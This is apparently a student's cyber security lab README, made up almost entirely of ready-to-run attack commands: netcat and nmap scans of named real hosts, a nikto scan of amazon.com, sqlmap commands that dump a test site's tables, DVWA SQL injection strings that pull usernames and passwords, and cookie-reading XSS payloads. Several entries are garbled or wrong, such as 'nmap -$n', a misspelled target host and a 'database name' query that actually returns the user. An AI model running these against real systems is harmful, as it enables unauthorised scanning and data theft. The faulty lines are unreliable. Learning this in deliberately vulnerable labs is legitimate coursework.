# CyberSecurity
Cyber Security GTU Practical

```
netcat

1.perform traffic probe
nc -v www.scet.ac.in 80

2.perform tcp scan on any five hosts and scan port numbers 1-20
nc -vz www.scet.ac.in 1-20

3.perform udp scan on any five hosts and scan port numbers 1-20
nc -vz -u www.scet.ac.in 1-20

4.Scan port numbers 80 and 22 of any five hosts by giving them input "Quit"
echo QUIT | nc -v www.scet.ac.in 80 22
```

```
nmap

1.Identify hosts on network
nmap -sn 184.72.216.0-255

2.Scan TCP Ports
nmap -sT www.triple5.tech

3.Scan TCP Ports without completing TCP three way-handshakes
sudo nmap -sS www.triple5.tech

4.Scan UDP Ports
nmap -sU www.triple5.tech

5.Scan TCP Ports with stealth scan
sudo nmap -sF www.triple5.tech

6.identify which hosts are live on network
nmap -$n www.triple5.tech

7.check which protocol service is available on the host
sudo nmap -sO www.triple5.tech

8.determine which service is available on the host
sudo nmap -sV www.triple5.tech

9. identify the operating system
sudo nmap -O www.triple5.tech
```

```
Nikto

1.scan website with nikto
nikto -host amazon.com
```

```
SQLmap

1.apply automated SQL injection using SQLNMAP
sqlmap -u http://testphp.vulneb.com/listproducts.php?cat=1 --current-user

2.find database of detail targeted site
sqlmap -u http://testphp.vulneb.com/listproducts.php?cat=1 --dbs

3.find table of detail targeted site
sqlmap -u http://testphp.vulneb.com/listproducts.php?cat=1 -D acuart --tables

4.find column detail for tables
sqlmap -u http://testphp.vulneb.com/listproducts.php?cat=1 -D acuart -T artists --column

5.Find actual data for given site
sqlmap -u http://testphp.vulneb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
```

```
DVWA
SQL Injection

1.method to extract all the First_names and Surnames from the database would be to use
%' or '1'='1'

2.The database version will be listed under surname in the last line as shown in the 
image below
%' or 0=0 union select null, version() #

3.To display the Database user who executed the PHP code powering the database, 
enter the text below in the USER ID field.
%' or 0=0 union select null, user() #

4.To display the database name, we will inject the SQL code below in the User ID field.
%' or 0=0 union select null, user() #

5.Display all tables in information_schema
%' and 1=0 union select null, table_name from information_schema.tables #

6.Display all the columns fields in the information_schema user table
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from 
information_schema.columns where table_name = 'users' #

7.Display all the columns field contents in the information_schema user table
%' and 1=0 union select null, 
concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```

```
XSS

1.Name: Test 1
Message: <script>alert("hello")</script>

2.Name: Test 2
Message: <iframe src="http://wikipedia.org"></iframe>

3.Name: Test 3
Message: <script>alert(document.cookie)</script>
```

```
WebGoat

1. smith or 1=1
2. smith %' or '0'='0
3. <script>alert("Hello")</script>  111
```
